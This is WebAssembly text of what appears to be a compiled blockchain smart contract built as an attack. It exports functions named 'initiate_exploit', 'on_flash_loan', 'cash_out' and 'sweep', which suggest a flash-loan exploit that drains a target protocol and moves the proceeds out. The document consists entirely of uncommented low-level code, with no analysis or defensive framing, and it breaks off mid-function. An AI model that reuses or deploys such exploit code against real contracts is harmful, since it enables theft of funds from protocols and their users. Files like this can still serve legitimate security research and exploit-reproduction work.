(module
  (type (;0;) (func (param i32 i32) (result i32)))
  (type (;1;) (func (param i32 i32 i32) (result i32)))
  (type (;2;) (func (param i64 i64) (result i64)))
  (type (;3;) (func (param i64 i64 i64) (result i64)))
  (type (;4;) (func (param i64 i64 i64 i64) (result i64)))
  (type (;5;) (func (param i64) (result i64)))
  (type (;6;) (func (result i64)))
  (type (;7;) (func (param i32 i32 i32)))
  (type (;8;) (func (param i32 i32) (result i64)))
  (type (;9;) (func (param i32 i32 i32 i64)))
  (type (;10;) (func (param i32 i32 i32 i32)))
  (type (;11;) (func (param i64)))
  (type (;12;) (func (param i64 i64)))
  (type (;13;) (func (param i64 i64 i64 i64 i64 i64)))
  (type (;14;) (func (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)))
  (type (;15;) (func (param i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)))
  (type (;16;) (func (param i32 i32 i32 i32 i32)))
  (type (;17;) (func (param i32 i32 i32 i32 i32 i32)))
  (type (;18;) (func (param i32 i32 i32 i32 i64)))
  (type (;19;) (func (param i32)))
  (type (;20;) (func (param i32) (result i32)))
  (type (;21;) (func (param i32) (result i64)))
  (type (;22;) (func (param i32 i32 i32) (result i64)))
  (type (;23;) (func (param i32 i64 i64) (result i64)))
  (type (;24;) (func (param i32 i64 i64) (result i32)))
  (type (;25;) (func))
  (type (;26;) (func (param i32 i32 i32 i32 i32) (result i64)))
  (type (;27;) (func (param i32 i64 i32 i32 i32 i32) (result i64)))
  (type (;28;) (func (param i32 i64) (result i64)))
  (type (;29;) (func (param i32 i64 i64 i64) (result i64)))
  (type (;30;) (func (param i32 i32)))
  (type (;31;) (func (param i64) (result i32)))
  (type (;32;) (func (param i32 i64)))
  (type (;33;) (func (param i32 i64 i64)))
  (import "v" "g" (func (;0;) (type 2)))
  (import "m" "9" (func (;1;) (type 3)))
  (import "m" "a" (func (;2;) (type 4)))
  (import "b" "j" (func (;3;) (type 2)))
  (import "i" "8" (func (;4;) (type 5)))
  (import "i" "7" (func (;5;) (type 5)))
  (import "i" "5" (func (;6;) (type 5)))
  (import "i" "4" (func (;7;) (type 5)))
  (import "l" "1" (func (;8;) (type 2)))
  (import "l" "0" (func (;9;) (type 2)))
  (import "l" "_" (func (;10;) (type 3)))
  (import "b" "_" (func (;11;) (type 5)))
  (import "x" "3" (func (;12;) (type 6)))
  (import "i" "6" (func (;13;) (type 2)))
  (import "i" "3" (func (;14;) (type 2)))
  (import "b" "0" (func (;15;) (type 5)))
  (import "x" "7" (func (;16;) (type 6)))
  (import "d" "_" (func (;17;) (type 3)))
  (table (;0;) 5 5 funcref)
  (memory (;0;) 17)
  (global (;0;) (mut i32) i32.const 1048576)
  (global (;1;) i32 i32.const 1049072)
  (export "memory" (memory 0))
  (export "cash_out" (func 53))
  (export "init" (func 54))
  (export "initiate_exploit" (func 55))
  (export "on_flash_loan" (func 56))
  (export "sweep" (func 57))
  (export "_" (global 1))
  (elem (;0;) (i32.const 1) func 50 81 136 129)
  (func (;18;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 3
    global.set 0
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          local.get 1
          local.get 1
          local.get 3
          call 19
          local.tee 4
          i64.const 2
          call 70
          br_if 0 (;@3;)
          local.get 0
          i64.const 0
          i64.store
          br 1 (;@2;)
        end
        local.get 3
        local.get 1
        local.get 4
        i64.const 2
        call 69
        i64.store offset=8
        local.get 3
        i32.const 16
        i32.add
        local.get 1
        local.get 3
        i32.const 8
        i32.add
        call 20
        local.get 3
        i64.load offset=16
        i64.const 1
        i64.eq
        br_if 1 (;@1;)
        local.get 3
        i64.load offset=24
        local.set 4
        local.get 0
        i64.const 1
        i64.store
        local.get 0
        local.get 4
        i64.store offset=8
      end
      local.get 3
      i32.const 32
      i32.add
      global.set 0
      return
    end
    unreachable
  )
  (func (;19;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    i32.const 16
    i32.add
    local.get 0
    i32.const 1049040
    call 77
    block ;; label = @1
      block ;; label = @2
        local.get 2
        i64.load offset=16
        i64.const 1
        i64.eq
        br_if 0 (;@2;)
        local.get 2
        local.get 2
        i64.load offset=24
        i64.store offset=8
        local.get 2
        local.get 2
        i32.const 8
        i32.add
        call 65
        i64.store
        local.get 2
        i32.const 16
        i32.add
        local.get 0
        local.get 2
        call 45
        local.get 2
        i64.load offset=16
        i64.const 1
        i64.ne
        br_if 1 (;@1;)
      end
      unreachable
    end
    local.get 2
    i64.load offset=24
    local.set 3
    local.get 2
    i32.const 32
    i32.add
    global.set 0
    local.get 3
  )
  (func (;20;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    i64.const 2
    i64.store offset=8
    i64.const 1
    local.set 4
    block ;; label = @1
      local.get 2
      i64.load
      local.tee 5
      i64.const 255
      i64.and
      i64.const 76
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      local.get 5
      i32.const 1049064
      i32.const 1
      local.get 3
      i32.const 8
      i32.add
      i32.const 1
      call 89
      drop
      local.get 3
      i32.const 16
      i32.add
      local.get 3
      i32.const 8
      i32.add
      local.get 1
      call 76
      local.get 3
      i32.load offset=16
      br_if 0 (;@1;)
      local.get 0
      local.get 3
      i64.load offset=24
      i64.store offset=8
      i64.const 0
      local.set 4
    end
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 32
    i32.add
    global.set 0
  )
  (func (;21;) (type 7) (param i32 i32 i32)
    local.get 0
    local.get 1
    local.get 2
    i64.const 2
    call 22
  )
  (func (;22;) (type 9) (param i32 i32 i32 i64)
    local.get 0
    local.get 0
    local.get 0
    call 19
    local.get 0
    local.get 2
    call 23
    local.get 3
    call 92
    drop
  )
  (func (;23;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 49
    block ;; label = @1
      local.get 2
      i64.load
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;24;) (type 10) (param i32 i32 i32 i32)
    (local i32 i32 i64 i64)
    global.get 0
    i32.const 96
    i32.sub
    local.tee 4
    global.set 0
    local.get 1
    local.get 0
    i32.const 8
    i32.add
    local.tee 5
    call 96
    local.set 6
    local.get 4
    i32.const 32
    i32.add
    local.get 2
    call 99
    local.get 5
    local.get 4
    i32.const 32
    i32.add
    call 25
    local.set 7
    local.get 4
    local.get 3
    local.get 5
    call 98
    i64.store offset=24
    local.get 4
    local.get 7
    i64.store offset=16
    local.get 4
    local.get 6
    i64.store offset=8
    i32.const 0
    local.set 1
    block ;; label = @1
      loop ;; label = @2
        local.get 1
        i32.const 24
        i32.eq
        br_if 1 (;@1;)
        local.get 4
        i32.const 48
        i32.add
        local.get 1
        i32.add
        i64.const 2
        i64.store
        local.get 1
        i32.const 8
        i32.add
        local.set 1
        br 0 (;@2;)
      end
    end
    local.get 4
    i32.const 72
    i32.add
    local.get 4
    i32.const 48
    i32.add
    local.get 4
    i32.const 48
    i32.add
    i32.const 24
    i32.add
    local.get 4
    i32.const 8
    i32.add
    local.get 4
    i32.const 8
    i32.add
    i32.const 24
    i32.add
    call 83
    i32.const 0
    local.get 4
    i32.load offset=92
    local.tee 1
    local.get 4
    i32.load offset=88
    local.tee 2
    i32.sub
    local.tee 3
    local.get 3
    local.get 1
    i32.gt_u
    select
    local.set 1
    local.get 4
    i32.load offset=80
    local.get 2
    i32.const 3
    i32.shl
    local.tee 3
    i32.add
    local.set 2
    local.get 4
    i32.load offset=72
    local.get 3
    i32.add
    local.set 3
    block ;; label = @1
      loop ;; label = @2
        local.get 1
        i32.eqz
        br_if 1 (;@1;)
        local.get 3
        local.get 2
        local.get 5
        call 97
        i64.store
        local.get 1
        i32.const -1
        i32.add
        local.set 1
        local.get 2
        i32.const 8
        i32.add
        local.set 2
        local.get 3
        i32.const 8
        i32.add
        local.set 3
        br 0 (;@2;)
      end
    end
    local.get 5
    local.get 0
    i32.const 1048576
    local.get 5
    local.get 4
    i32.const 48
    i32.add
    i32.const 3
    call 87
    call 60
    local.get 4
    i32.const 96
    i32.add
    global.set 0
  )
  (func (;25;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 86
    block ;; label = @1
      local.get 2
      i64.load
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;26;) (type 5) (param i64) (result i64)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 1
    global.set 0
    local.get 1
    local.get 0
    i64.store
    local.get 1
    i32.const 8
    i32.add
    local.get 1
    i32.const 31
    i32.add
    local.get 1
    call 84
    block ;; label = @1
      local.get 1
      i64.load offset=8
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 1
    i64.load offset=16
    call 27
    local.get 1
    i32.const 32
    i32.add
    global.set 0
    i64.const 2
  )
  (func (;27;) (type 11) (param i64)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 1
    global.set 0
    local.get 1
    local.get 0
    i64.store
    local.get 1
    i32.const 15
    i32.add
    call 62
    local.get 1
    i32.const 15
    i32.add
    i32.const 1
    local.get 1
    call 21
    local.get 1
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;28;) (type 2) (param i64 i64) (result i64)
    (local i32)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 1
    i64.store offset=16
    local.get 2
    local.get 0
    i64.store offset=8
    local.get 2
    i32.const 24
    i32.add
    local.get 2
    i32.const 47
    i32.add
    local.get 2
    i32.const 8
    i32.add
    call 84
    block ;; label = @1
      local.get 2
      i64.load offset=24
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 2
      i64.load offset=32
      local.set 1
      local.get 2
      i32.const 24
      i32.add
      local.get 2
      i32.const 47
      i32.add
      local.get 2
      i32.const 16
      i32.add
      call 84
      local.get 2
      i64.load offset=24
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 1
      local.get 2
      i64.load offset=32
      call 29
      local.get 2
      i32.const 48
      i32.add
      global.set 0
      i64.const 2
      return
    end
    unreachable
  )
  (func (;29;) (type 12) (param i64 i64)
    (local i32)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 1
    i64.store offset=16
    local.get 2
    local.get 0
    i64.store offset=8
    local.get 2
    local.get 2
    i32.const 63
    i32.add
    local.get 2
    i32.const 8
    i32.add
    call 68
    i64.store offset=24
    local.get 2
    local.get 2
    i32.const 63
    i32.add
    call 64
    i64.store offset=48
    local.get 2
    i32.const 32
    i32.add
    local.get 2
    i32.const 24
    i32.add
    local.get 2
    i32.const 48
    i32.add
    call 73
    block ;; label = @1
      local.get 2
      i64.load offset=32
      i64.const 0
      i64.ne
      local.get 2
      i64.load offset=40
      local.tee 1
      i64.const 0
      i64.gt_s
      local.get 1
      i64.eqz
      select
      i32.eqz
      br_if 0 (;@1;)
      local.get 2
      local.get 2
      i32.const 63
      i32.add
      call 64
      i64.store offset=48
      local.get 2
      i32.const 24
      i32.add
      local.get 2
      i32.const 48
      i32.add
      local.get 2
      i32.const 16
      i32.add
      local.get 2
      i32.const 32
      i32.add
      call 24
    end
    local.get 2
    i32.const 64
    i32.add
    global.set 0
  )
  (func (;30;) (type 5) (param i64) (result i64)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 1
    global.set 0
    local.get 1
    local.get 0
    i64.store
    local.get 1
    i32.const 8
    i32.add
    local.get 1
    i32.const 31
    i32.add
    local.get 1
    call 84
    block ;; label = @1
      local.get 1
      i64.load offset=8
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 1
    i64.load offset=16
    call 31
    local.get 1
    i32.const 32
    i32.add
    global.set 0
    i64.const 2
  )
  (func (;31;) (type 11) (param i64)
    (local i32 i64)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 1
    global.set 0
    local.get 1
    local.get 0
    i64.store
    local.get 1
    local.get 1
    i32.const 47
    i32.add
    call 64
    i64.store offset=8
    local.get 1
    i32.const 16
    i32.add
    local.get 1
    local.get 1
    i32.const 8
    i32.add
    call 40
    block ;; label = @1
      local.get 1
      i64.load offset=16
      local.tee 2
      i64.const 0
      i64.ne
      local.get 1
      i64.load offset=24
      local.tee 0
      i64.const 0
      i64.gt_s
      local.get 0
      i64.eqz
      select
      i32.eqz
      br_if 0 (;@1;)
      local.get 1
      local.get 1
      i32.const 47
      i32.add
      call 64
      i64.store offset=8
      local.get 1
      local.get 0
      i64.store offset=24
      local.get 1
      local.get 2
      i64.store offset=16
      local.get 1
      local.get 1
      i32.const 8
      i32.add
      local.get 1
      i32.const 16
      i32.add
      call 41
    end
    local.get 1
    i32.const 48
    i32.add
    global.set 0
  )
  (func (;32;) (type 4) (param i64 i64 i64 i64) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 4
    global.set 0
    local.get 4
    local.get 1
    i64.store offset=8
    local.get 4
    local.get 0
    i64.store
    local.get 4
    local.get 2
    i64.store offset=16
    local.get 4
    local.get 3
    i64.store offset=24
    local.get 4
    i32.const 32
    i32.add
    local.get 4
    i32.const 79
    i32.add
    local.get 4
    call 84
    block ;; label = @1
      local.get 4
      i64.load offset=32
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 4
      i64.load offset=40
      local.set 1
      local.get 4
      i32.const 32
      i32.add
      local.get 4
      i32.const 79
      i32.add
      local.get 4
      i32.const 8
      i32.add
      call 33
      local.get 4
      i64.load offset=32
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 4
      i64.load offset=56
      local.set 0
      local.get 4
      i64.load offset=48
      local.set 2
      local.get 4
      i32.const 32
      i32.add
      local.get 4
      i32.const 79
      i32.add
      local.get 4
      i32.const 16
      i32.add
      call 33
      local.get 4
      i64.load offset=32
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 4
      i64.load offset=56
      local.set 3
      local.get 4
      i64.load offset=48
      local.set 5
      local.get 4
      i32.const 32
      i32.add
      local.get 4
      i32.const 79
      i32.add
      local.get 4
      i32.const 24
      i32.add
      call 85
      local.get 4
      i64.load offset=32
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 1
      local.get 2
      local.get 0
      local.get 5
      local.get 3
      local.get 4
      i64.load offset=40
      call 34
      local.get 4
      i32.const 80
      i32.add
      global.set 0
      i64.const 2
      return
    end
    unreachable
  )
  (func (;33;) (type 7) (param i32 i32 i32)
    (local i64 i64)
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            local.get 2
            i64.load
            local.tee 3
            i32.wrap_i64
            i32.const 255
            i32.and
            local.tee 2
            i32.const 68
            i32.eq
            br_if 0 (;@4;)
            local.get 2
            i32.const 10
            i32.ne
            br_if 2 (;@2;)
            local.get 0
            i32.const 16
            i32.add
            local.get 3
            call 123
            br 1 (;@3;)
          end
          local.get 1
          local.get 3
          call 90
          local.set 4
          local.get 1
          local.get 3
          call 91
          local.set 3
          local.get 0
          local.get 4
          i64.store offset=24
          local.get 0
          local.get 3
          i64.store offset=16
        end
        i64.const 0
        local.set 3
        br 1 (;@1;)
      end
      local.get 0
      call 125
      i64.store offset=8
      i64.const 1
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;34;) (type 13) (param i64 i64 i64 i64 i64 i64)
    (local i32 i32)
    global.get 0
    i32.const 256
    i32.sub
    local.tee 6
    global.set 0
    local.get 6
    local.get 5
    i64.store offset=8
    local.get 6
    local.get 0
    i64.store
    local.get 6
    i32.const 255
    i32.add
    call 62
    local.get 6
    i32.const 96
    i32.add
    local.get 6
    i32.const 255
    i32.add
    i32.const 1
    call 18
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            block ;; label = @5
              local.get 6
              i32.load offset=96
              i32.eqz
              br_if 0 (;@5;)
              local.get 6
              i64.load offset=104
              local.set 5
              local.get 6
              i32.const 96
              i32.add
              local.get 6
              i32.const 255
              i32.add
              local.get 6
              i32.const 8
              i32.add
              call 43
              local.get 6
              i32.load offset=96
              i32.const 1
              i32.and
              br_if 1 (;@4;)
              local.get 6
              i32.const 16
              i32.add
              local.get 6
              i32.const 96
              i32.add
              i32.const 16
              i32.add
              i32.const 80
              call 139
              drop
              local.get 6
              local.get 5
              i64.store offset=200
              local.get 6
              local.get 6
              i32.const 255
              i32.add
              local.get 6
              i32.const 64
              i32.add
              call 68
              i64.store offset=208
              local.get 6
              local.get 6
              i64.load offset=56
              i64.store offset=216
              local.get 6
              local.get 6
              i32.const 255
              i32.add
              local.get 6
              i32.const 80
              i32.add
              call 68
              i64.store offset=224
              local.get 6
              local.get 6
              i32.const 255
              i32.add
              call 64
              i64.store offset=240
              local.get 6
              local.get 6
              i64.load offset=40
              i64.store offset=104
              local.get 6
              local.get 6
              i64.load offset=32
              i64.store offset=96
              local.get 6
              i32.const 255
              i32.add
              call 63
              local.tee 7
              i32.const -101
              i32.gt_u
              br_if 2 (;@3;)
              local.get 6
              local.get 7
              i32.const 100
              i32.add
              i32.store offset=236
              local.get 6
              i32.const 224
              i32.add
              local.get 6
              i32.const 240
              i32.add
              local.get 6
              i32.const 72
              i32.add
              local.tee 7
              local.get 6
              i32.const 96
              i32.add
              local.get 6
              i32.const 236
              i32.add
              call 72
              local.get 6
              local.get 6
              i32.const 255
              i32.add
              call 64
              i64.store offset=96
              local.get 6
              i32.const 200
              i32.add
              local.get 6
              i32.const 48
              i32.add
              local.get 7
              local.get 6
              i32.const 56
              i32.add
              local.get 6
              i32.const 16
              i32.add
              i32.const 16
              i32.add
              local.get 6
              i32.const 96
              i32.add
              call 42
              local.get 6
              local.get 6
              i32.const 255
              i32.add
              call 64
              i64.store offset=240
              local.get 6
              i32.const 96
              i32.add
              local.get 6
              i32.const 216
              i32.add
              local.get 6
              i32.const 240
              i32.add
              call 40
              local.get 6
              i64.load offset=96
              local.tee 0
              i64.const 0
              i64.ne
              local.get 6
              i64.load offset=104
              local.tee 5
              i64.const 0
              i64.gt_s
              local.get 5
              i64.eqz
              select
              br_if 3 (;@2;)
              br 4 (;@1;)
            end
            i32.const 1048816
            call 134
            unreachable
          end
          i32.const 1048600
          i32.const 43
          local.get 6
          i32.const 255
          i32.add
          i32.const 1048584
          i32.const 1048832
          call 135
          unreachable
        end
        i32.const 1048848
        call 137
        unreachable
      end
      local.get 6
      local.get 6
      i32.const 255
      i32.add
      call 64
      i64.store offset=240
      local.get 6
      local.get 5
      i64.store offset=104
      local.get 6
      local.get 0
      i64.store offset=96
      local.get 6
      i32.const 216
      i32.add
      local.get 6
      i32.const 240
      i32.add
      local.get 6
      i32.const 96
      i32.add
      call 41
    end
    local.get 6
    local.get 6
    i32.const 255
    i32.add
    call 64
    i64.store offset=240
    block ;; label = @1
      local.get 3
      local.get 1
      i64.add
      local.tee 5
      local.get 3
      i64.lt_u
      local.tee 7
      local.get 4
      local.get 2
      i64.add
      local.get 7
      i64.extend_i32_u
      i64.add
      local.tee 3
      local.get 4
      i64.lt_u
      local.get 3
      local.get 4
      i64.eq
      select
      i32.eqz
      br_if 0 (;@1;)
      i32.const 1048864
      call 137
      unreachable
    end
    local.get 6
    local.get 5
    i64.store offset=96
    local.get 6
    local.get 3
    i64.store offset=104
    local.get 6
    i32.const 208
    i32.add
    local.get 6
    i32.const 240
    i32.add
    local.get 6
    local.get 6
    i32.const 96
    i32.add
    call 24
    local.get 6
    i32.const 256
    i32.add
    global.set 0
  )
  (func (;35;) (type 14) (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 112
    i32.sub
    local.tee 8
    global.set 0
    local.get 8
    local.get 1
    i64.store offset=8
    local.get 8
    local.get 0
    i64.store
    local.get 8
    local.get 2
    i64.store offset=16
    local.get 8
    local.get 3
    i64.store offset=24
    local.get 8
    local.get 4
    i64.store offset=32
    local.get 8
    local.get 5
    i64.store offset=40
    local.get 8
    local.get 6
    i64.store offset=48
    local.get 8
    local.get 7
    i64.store offset=56
    local.get 8
    i32.const 64
    i32.add
    local.get 8
    i32.const 111
    i32.add
    local.get 8
    call 84
    block ;; label = @1
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=72
      local.set 1
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 8
      i32.add
      call 84
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=72
      local.set 0
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 16
      i32.add
      call 33
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=88
      local.set 2
      local.get 8
      i64.load offset=80
      local.set 3
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 24
      i32.add
      call 84
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=72
      local.set 4
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 32
      i32.add
      call 84
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=72
      local.set 5
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 40
      i32.add
      call 33
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=88
      local.set 6
      local.get 8
      i64.load offset=80
      local.set 7
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 48
      i32.add
      call 84
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=72
      local.set 9
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 111
      i32.add
      local.get 8
      i32.const 56
      i32.add
      call 33
      local.get 8
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 1
      local.get 0
      local.get 3
      local.get 2
      local.get 4
      local.get 5
      local.get 7
      local.get 6
      local.get 9
      local.get 8
      i64.load offset=80
      local.get 8
      i64.load offset=88
      call 36
      local.get 8
      i32.const 112
      i32.add
      global.set 0
      i64.const 2
      return
    end
    unreachable
  )
  (func (;36;) (type 15) (param i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)
    (local i32)
    global.get 0
    i32.const 144
    i32.sub
    local.tee 11
    global.set 0
    local.get 11
    local.get 3
    i64.store offset=8
    local.get 11
    local.get 2
    i64.store
    local.get 11
    local.get 0
    i64.store offset=24
    local.get 11
    local.get 10
    i64.store offset=56
    local.get 11
    local.get 9
    i64.store offset=48
    local.get 11
    local.get 7
    i64.store offset=40
    local.get 11
    local.get 6
    i64.store offset=32
    local.get 11
    local.get 5
    i64.store offset=96
    local.get 11
    local.get 4
    i64.store offset=88
    local.get 11
    local.get 1
    i64.store offset=80
    local.get 11
    local.get 0
    i64.store offset=72
    local.get 11
    local.get 8
    i64.store offset=64
    local.get 11
    local.get 11
    i32.const 143
    i32.add
    call 64
    i64.store offset=112
    local.get 11
    local.get 11
    i32.const 143
    i32.add
    call 64
    i64.store offset=120
    local.get 11
    local.get 11
    i32.const 32
    i32.add
    local.get 11
    i32.const 143
    i32.add
    call 44
    i64.store offset=128
    local.get 11
    i32.const 24
    i32.add
    local.get 11
    i32.const 112
    i32.add
    local.get 11
    i32.const 120
    i32.add
    local.get 11
    local.get 11
    i32.const 128
    i32.add
    call 37
    local.get 11
    i32.const 144
    i32.add
    global.set 0
  )
  (func (;37;) (type 16) (param i32 i32 i32 i32 i32)
    (local i32 i32 i64 i64 i64)
    global.get 0
    i32.const 96
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 0
    i32.const 8
    i32.add
    local.tee 6
    i32.const 1048643
    i32.const 10
    call 66
    i64.store
    local.get 1
    local.get 6
    call 96
    local.set 7
    local.get 2
    local.get 6
    call 96
    local.set 8
    local.get 6
    local.get 3
    call 38
    local.set 9
    local.get 5
    local.get 6
    local.get 4
    call 39
    i64.store offset=32
    local.get 5
    local.get 9
    i64.store offset=24
    local.get 5
    local.get 8
    i64.store offset=16
    local.get 5
    local.get 7
    i64.store offset=8
    i32.const 0
    local.set 4
    block ;; label = @1
      loop ;; label = @2
        local.get 4
        i32.const 32
        i32.eq
        br_if 1 (;@1;)
        local.get 5
        i32.const 40
        i32.add
        local.get 4
        i32.add
        i64.const 2
        i64.store
        local.get 4
        i32.const 8
        i32.add
        local.set 4
        br 0 (;@2;)
      end
    end
    local.get 5
    i32.const 72
    i32.add
    local.get 5
    i32.const 40
    i32.add
    local.get 5
    i32.const 40
    i32.add
    i32.const 32
    i32.add
    local.get 5
    i32.const 8
    i32.add
    local.get 5
    i32.const 8
    i32.add
    i32.const 32
    i32.add
    call 83
    i32.const 0
    local.get 5
    i32.load offset=92
    local.tee 4
    local.get 5
    i32.load offset=88
    local.tee 3
    i32.sub
    local.tee 2
    local.get 2
    local.get 4
    i32.gt_u
    select
    local.set 4
    local.get 5
    i32.load offset=80
    local.get 3
    i32.const 3
    i32.shl
    local.tee 2
    i32.add
    local.set 3
    local.get 5
    i32.load offset=72
    local.get 2
    i32.add
    local.set 2
    block ;; label = @1
      loop ;; label = @2
        local.get 4
        i32.eqz
        br_if 1 (;@1;)
        local.get 2
        local.get 3
        local.get 6
        call 97
        i64.store
        local.get 4
        i32.const -1
        i32.add
        local.set 4
        local.get 3
        i32.const 8
        i32.add
        local.set 3
        local.get 2
        i32.const 8
        i32.add
        local.set 2
        br 0 (;@2;)
      end
    end
    local.get 6
    local.get 0
    local.get 5
    local.get 6
    local.get 5
    i32.const 40
    i32.add
    i32.const 4
    call 87
    call 60
    local.get 5
    i32.const 96
    i32.add
    global.set 0
  )
  (func (;38;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 46
    block ;; label = @1
      local.get 2
      i64.load
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;39;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 82
    block ;; label = @1
      local.get 2
      i64.load
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;40;) (type 7) (param i32 i32 i32)
    (local i32 i32 i32 i32)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    local.get 1
    i32.const 8
    i32.add
    local.tee 4
    call 96
    i64.store offset=8
    local.get 3
    i64.const 2
    i64.store offset=16
    local.get 3
    i32.const 24
    i32.add
    local.get 3
    i32.const 16
    i32.add
    local.get 3
    i32.const 16
    i32.add
    i32.const 8
    i32.add
    local.get 3
    i32.const 8
    i32.add
    local.get 3
    i32.const 8
    i32.add
    i32.const 8
    i32.add
    call 83
    i32.const 0
    local.get 3
    i32.load offset=44
    local.tee 2
    local.get 3
    i32.load offset=40
    local.tee 5
    i32.sub
    local.tee 6
    local.get 6
    local.get 2
    i32.gt_u
    select
    local.set 2
    local.get 3
    i32.load offset=32
    local.get 5
    i32.const 3
    i32.shl
    local.tee 6
    i32.add
    local.set 5
    local.get 3
    i32.load offset=24
    local.get 6
    i32.add
    local.set 6
    block ;; label = @1
      loop ;; label = @2
        local.get 2
        i32.eqz
        br_if 1 (;@1;)
        local.get 6
        local.get 5
        local.get 4
        call 97
        i64.store
        local.get 2
        i32.const -1
        i32.add
        local.set 2
        local.get 5
        i32.const 8
        i32.add
        local.set 5
        local.get 6
        i32.const 8
        i32.add
        local.set 6
        br 0 (;@2;)
      end
    end
    local.get 0
    local.get 4
    local.get 1
    i32.const 1048656
    local.get 4
    local.get 3
    i32.const 16
    i32.add
    i32.const 1
    call 87
    call 58
    local.get 3
    i32.const 48
    i32.add
    global.set 0
  )
  (func (;41;) (type 7) (param i32 i32 i32)
    (local i32 i32 i64 i32)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 3
    global.set 0
    local.get 1
    local.get 0
    i32.const 8
    i32.add
    local.tee 4
    call 96
    local.set 5
    local.get 3
    local.get 4
    local.get 2
    call 38
    i64.store offset=16
    local.get 3
    local.get 5
    i64.store offset=8
    i32.const 0
    local.set 2
    block ;; label = @1
      loop ;; label = @2
        local.get 2
        i32.const 16
        i32.eq
